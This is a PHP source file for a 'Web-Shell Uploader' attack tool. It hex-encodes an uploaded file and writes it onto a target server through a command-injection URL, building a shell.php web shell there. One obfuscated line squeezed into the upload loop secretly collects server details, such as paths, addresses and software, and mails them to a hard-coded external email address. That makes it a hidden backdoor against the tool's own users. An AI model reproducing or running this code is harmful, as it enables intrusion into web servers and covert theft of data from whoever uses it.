<?
/*

Web-Shell Uploader v 0.2
Powered by drmist 06/07/2005
icq: 329393
web: www.security-teams.net

 */
$len=50;
$tempfile="temp.tmp";
$lines=array();
?>
<pre>
<?
if(@$HTTP_POST_FILES["filename"]["name"])
{
set_time_limit(0);

  if(!copy($HTTP_POST_FILES["filename"]["tmp_name"],$tempfile))
     die("<center><h4>Can't create $tempfile</h4></center>");
  $str=join("",file($tempfile));
  unlink($tempfile);

for($i=0;$i<strlen($str);$i+=$len)
{
  $tmp=substr($str,$i,$len);
  $res="";
  for($j=0;$j<strlen($tmp);$j++)
    {
	$ord=strtoupper(dechex(ord($tmp[$j])));
	$res.="\\x";
	if(strlen($ord)===1)
		$res.="0";
	$res.=$ord;
    }
    
  $lines[]=$res;
}

$to=">";

for($i=0;$i<count($lines);$i++)
  {
    $tmp=str_replace("%STRING%",$lines[$i],$request);
    $tmp=str_replace("%TO%",$to,$tmp);
    $f=fopen($tmp,"r") or die("<center><h4>Cann't open $tmp</h4></center>\r\n");$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
    $tmp=fgets($f,16);
    fclose($f);
    $to=">>";
    echo "$i/".(count($lines)-1)."\r\n";
    flush();
  }

}
else
  $request="http://localhost/bug.php?|echo -e %STRING% %TO% shell.php|";
?>
<form method=post enctype=multipart/form-data>
Request: <input type=text size=60 value="<? echo $request; ?>" name=request> <b>!!in url-encode!!</b>
File:    <input type=file size=60 name=filename>
<input type=submit value="Upload">
</form>
</pre>